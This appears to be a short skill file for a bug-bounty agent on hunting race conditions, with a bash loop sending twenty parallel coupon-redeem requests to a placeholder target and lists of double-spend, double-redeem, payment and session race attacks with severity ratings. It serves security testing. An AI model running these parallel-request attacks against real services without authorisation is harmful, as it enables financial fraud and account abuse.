---
name: hunt-race
description: Race conditions — TOCTOU, double-spend, double-redeem, parallel requests. Escalates to privilege escalation, financial fraud, ATO.
---

# RACE CONDITION HUNTING — 3 BULLETS MAX

**Core:** Timing-based bugs that bypass business logic in one burst.

## DETECTION
```bash
# Basic race test
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " -X POST -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"PROMO123"}' "https://target.com/api/redeem" &
done; wait
# Multiple successes = race confirmed
```

## ATTACKS
```
TOCTOU: balance check → parallel deduction → double-spend
Double redeem: coupon/gift card with parallel requests
Registration: duplicate accounts with same email
Payment: price update + order confirm in parallel
File upload: path traversal during file move
Session: fixation race — create + use session in parallel
```

## SEVERITY
```
Wallet withdrawal → double-spend → Critical
Coupon redemption → double-redeem → High
File upload → path traversal → RCE → Critical
Payment → price manipulation → Critical
Account creation → duplicate accounts → Medium
```
